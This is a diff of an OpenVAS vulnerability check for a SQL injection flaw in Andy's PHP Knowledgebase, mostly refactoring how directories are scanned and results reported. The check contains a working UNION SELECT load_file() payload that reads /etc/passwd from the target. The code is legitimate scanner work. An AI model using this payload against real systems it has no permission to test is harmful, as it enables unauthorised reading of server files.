@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_aphpkb_47097.nasl 5497 2017-03-06 10:23:23Z teissa $
+# $Id: gb_aphpkb_47097.nasl 5747 2017-03-28 12:18:28Z cfi $
 #
 # Andy's PHP Knowledgebase 's' Parameter SQL Injection Vulnerability
 #
@@ -37,16 +37,16 @@ be affected.";
 
 tag_solution = "Updates are available. Please contact the vendor for more information.";
 
-if (description)
+if(description)
 {
  script_id(103135);
- script_version("$Revision: 5497 $");
- script_tag(name:"last_modification", value:"$Date: 2017-03-06 11:23:23 +0100 (Mon, 06 Mar 2017) $");
+ script_version("$Revision: 5747 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-28 14:18:28 +0200 (Tue, 28 Mar 2017) $");
  script_tag(name:"creation_date", value:"2011-03-31 17:03:50 +0200 (Thu, 31 Mar 2011)");
  script_bugtraq_id(47097);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_cve_id("CVE-2011-1546");
+ script_cve_id("CVE-2011-1546");
 
  script_name("Andy's PHP Knowledgebase 's' Parameter SQL Injection Vulnerability");
 
@@ -67,25 +67,20 @@ if (description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("global_settings.inc");
    
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port))exit(0);
 
-dirs = make_list("/aphpkb","/kb",cgi_dirs());
+foreach dir( make_list_unique( "/aphpkb", "/kb", cgi_dirs( port:port ) ) ) {
 
-foreach dir (dirs) {
-   
+  if( dir == "/" ) dir = "";
   url = string(dir,"/a_viewusers.php?s=1+UNION+SELECT+load_file(0x2f6574632f706173737764),null,null,null,null,null,null+limit+0"); 
 
   if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {
-     
-    security_message(port:port);
-    exit(0);
-
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
   }
 }
 
-exit(0);
-
+exit( 99 );
